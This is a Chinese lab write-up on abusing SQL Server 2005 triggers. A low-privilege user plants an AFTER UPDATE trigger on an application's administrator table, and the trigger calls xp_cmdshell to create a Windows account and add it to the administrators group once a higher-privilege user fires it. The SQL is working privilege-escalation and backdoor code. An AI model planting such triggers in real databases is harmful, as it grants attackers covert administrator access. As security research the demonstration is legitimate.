# SqlServer 2005 Trigger

0x01 什么是触发器：
------------

* * *

触发器对表进行插入、更新、删除的时候会自动执行的特殊存储过程。触发器一般用在check约束更加复杂的约束上面。触发器和普通的存储过程的区别是：触发器是当对某一个表进行操作。诸如：update、insert、delete这些操作的时候，系统会自动调用执行该表上对应的触发器。SQL Server 2005中触发器可以分为两类：DML触发器和DDL触发器，其中DDL触发器它们会影响多种数据定义语言语句而激发，这些语句有create、alter、drop语句。

0x02 问题描述：
----------

* * *

a)通过Sqlserver的触发器，可以利用执行者的权限执行自定义的命令。

b)渗透过程中可能利用的触发器场景：在设置好触发器以后，等待、诱使高权限用户去触发这个触发器，来实现入侵、提权、留后门等目的。

c)Sqlserver的触发器可以分为两类：DML触发器(After insert，After delete，After update和instead of)和DDL触发器（for）。

实验环境： Win2003x86 && SqlServer 2005，默认安装Sqlserver，安装一个开源应用siteserver，并建立test用户，不给予服务器角色，数据库角色仅给予dbo和public权限。并将test库与test用户相互映射。SqlServer的xp_cmdshell已经被恢复。

实验过程： a)使用test用户建立触发器语句：

```
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO                             --这些是 SQL-92 设置语句，使 mssql 遵从 SQL-92 规则。
CREATE TRIGGER test
   ON bairong_Administrator
   AFTER UPDATE           /*建立一个作用于表bairong_Administrator的、
                            类型为After update的、名为test的触发器*/
AS 
BEGIN
    --EXECUTE SP_ADDEXTENDEDPROC 'MASTER.DBO.XP_CMDSHELL','XPLOG70.DLL'
           EXECUTE MASTER.DBO.XP_CMDSHELL 'net user STD 123456 /add'
    EXECUTE MASTER.DBO.XP_CMDSHELL 'net localgroup administrators STD /add'
           /*默认格式begin为开头加上触发后执行的语句,这里是利用储存过程添加系统账号。*/
END
GO

```

![enter image description here](http://drops.javaweb.org/uploads/images/d4433281cfea7b67fb87ed1f4d509403441cee24.jpg)

b)执行UPDATE操作，是触发器执行：

1)使用UPDATE语句来触发触发器：

```
UPDATE bairong_Administrator SET Email='STD@nsfocus.com' WHERE UserName='admin';

```

使用test用户执行：

![enter image description here](http://drops.javaweb.org/uploads/images/d1d34d9a81caad3f1b0e3c71589ce9ba413a58a6.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/e7141c597a79abc6dfd4df475392c63135679310.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/29b33b0fbd58bcfc74e6808abd16685db9723bce.jpg)

2)使用sa用户执行：

![enter image description here](http://drops.javaweb.org/uploads/images/fe11e7d9005f2085cfe77f5cb5d5be0a1eaf29a9.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/b548d0c3e8142ebb6bb405b2bb28aeaad7802a4c.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/fed287a71bb7d45b752594f90975b7cfc87cab14.jpg)

那么这就产生一个问题了，如何利用被动触发留后门或渗透攻击。